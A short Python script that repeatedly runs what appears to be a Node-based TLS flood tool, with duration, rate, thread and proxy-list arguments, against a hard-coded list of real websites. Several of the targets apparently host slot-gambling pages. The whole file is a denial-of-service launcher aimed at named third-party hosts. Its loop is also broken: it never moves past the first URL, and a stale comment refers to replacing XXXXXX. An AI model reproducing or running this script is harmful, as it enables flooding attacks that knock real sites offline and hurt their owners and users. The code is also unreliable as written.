import os
import time

# List of URLs
urls = [
    "https://icalled-fbs-unj.akademisi.co.id/vendor/countdowntime/?glazin=ulti500",
	"https://icalled-fbs-unj.akademisi.co.id/vendor/countdowntime/?glazin=ulti700%20login",
	"https://icalled-fbs-unj.akademisi.co.id/vendor/countdowntime/",
	"https://www.harniva.com/assets/backend/admin/plugins/source/estebu/seger/ulti700.html",
	"https://reineboldbaseball.com/ulti88-22/",
	"https://neenah.nupark.com/?slot=ULTI188%20LOGIN",
	"https://sivasakthiacademy.org/ulti-188-6/"
]

# Loop through each URL
for url in urls:
    while True:
        # Replace XXXXXX with the current URL
        os.system(f"node tls {url} 600 64 10 proxy.txt")
        time.sleep(10)
